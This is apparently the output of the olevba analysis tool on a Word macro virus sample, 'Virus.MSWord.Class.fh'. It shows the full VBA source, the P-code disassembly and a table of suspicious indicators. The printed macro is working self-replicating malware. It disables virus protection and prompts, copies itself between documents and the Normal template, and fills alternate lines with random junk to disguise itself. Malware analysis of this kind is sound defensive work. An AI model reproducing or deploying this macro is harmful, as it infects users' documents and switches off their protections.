olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fh - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
UJ26 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.ConfirmConversions = 0
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
Application.EnableCancelKey = 0
CCR = GBG + IGU
Options.VirusProtection = 0
VIG = DDO + JJP
OA92 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set SJ28 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
CV10 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set SJ28 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
OLS = BEO + JHD
OA92 = OA92 + 2
PUL = BQI + KKE
MD21 = True
HCM = DUC + JGT
End If
QGO = FBA + HRG
If MD21 <> True And CV10 <> True Then GoTo UJ71
FKF = HAK + ETM
If MD21 = True Then SJ28.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, OA92 - 1))
QUH = LBN + JVC
If CV10 = True Then SJ28.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UJ26 - 1))
UNH = DKE + VCA
With SJ28.CodeModule
HMU = LIS + SOP
For x = 2 To (SJ28.CodeModule.CountOfLines - 1) Step 2
VHK = JPD + JLR
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
LJL = FNK + OTI
Next x
GGD = LEM + HTK
End With
EPQ = NRD + REV
UJ71:
BBR = IKC + CDB
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.fh
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11896 bytes
' Line #0:
' 	FuncDefn (Sub Document_Close())
' Line #1:
' 	Ld GGR 
' 	Ld AQR 
' 	Add 
' 	St PLM 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld SRI 
' 	Ld VTB 
' 	Add 
' 	St PAJ 
' Line #4:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UJ26 
' Line #5:
' 	Ld QBN 
' 	Ld KGN 
' 	Add 
' 	St UIL 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	Ld SSM 
' 	Ld VUE 
' 	Add 
' 	St OFG 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	Ld LCV 
' 	Ld OAM 
' 	Add 
' 	St PVF 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	Ld GBG 
' 	Ld IGU 
' 	Add 
' 	St CCR 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	Ld DDO 
' 	Ld JJP 
' 	Add 
' 	St VIG 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St OA92 
' Line #15:
' 	Ld EMB 
' 	Ld KTF 
' 	Add 
' 	St HNE 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld UNN 
' 	Ld JCM 
' 	Add 
' 	St RIG 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set SJ28 
' Line #19:
' 	Ld ALU 
' 	Ld JOL 
' 	Add 
' 	St PUS 
' Line #20:
' 	LitVarSpecial (True)
' 	St CV10 
' Line #21:
' 	Ld IFB 
' 	Ld FVB 
' 	Add 
' 	St LKH 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld DKF 
' 	Ld NLD 
' 	Add 
' 	St IIK 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld ICR 
' 	Ld KQN 
' 	Add 
' 	St UOL 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set SJ28 
' Line #27:
' 	Ld BCH 
' 	Ld CAL 
' 	Add 
' 	St SAE 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0009 "' ****** "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000E " was infected "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #29:
' 	Ld BEO 
' 	Ld JHD 
' 	Add 
' 	St OLS 
' Line #30:
' 	Ld OA92 
' 	LitDI2 0x0002 
' 	Add 
' 	St OA92 
' Line #31:
' 	Ld BQI 
' 	Ld KKE 
' 	Add 
' 	St PUL 
' Line #32:
' 	LitVarSpecial (True)
' 	St MD21 
' Line #33:
' 	Ld DUC 
' 	Ld JGT 
' 	Add 
' 	St HCM 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld FBA 
' 	Ld HRG 
' 	Add 
' 	St QGO 
' Line #36:
' 	Ld MD21 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld CV10 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo UJ71 
' 	EndIf 
' Line #37:
' 	Ld HAK 
' 	Ld ETM 
' 	Add 
' 	St FKF 
' Line #38:
' 	Ld MD21 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld OA92 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld SJ28 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #39:
' 	Ld LBN 
' 	Ld JVC 
' 	Add 
' 	St QUH 
' Line #40:
' 	Ld CV10 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld UJ26 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld SJ28 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #41:
' 	Ld DKE 
' 	Ld VCA 
' 	Add 
' 	St UNH 
' Line #42:
' 	StartWithExpr 
' 	Ld SJ28 
' 	MemLd CodeModule 
' 	With 
' Line #43:
' 	Ld LIS 
' 	Ld SOP 
' 	Add 
' 	St HMU 
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld SJ28 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #45:
' 	Ld JPD 
' 	Ld JLR 
' 	Add 
' 	St VHK 
' Line #46:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	Ld FNK 
' 	Ld OTI 
' 	Add 
' 	St LJL 
' Line #48:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	Ld LEM 
' 	Ld HTK 
' 	Add 
' 	St GGD 
' Line #50:
' 	EndWith 
' Line #51:
' 	Ld NRD 
' 	Ld REV 
' 	Add 
' 	St EPQ 
' Line #52:
' 	Label UJ71 
' Line #53:
' 	Ld IKC 
' 	Ld CDB 
' 	Add 
' 	St BBR 
' Line #54:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

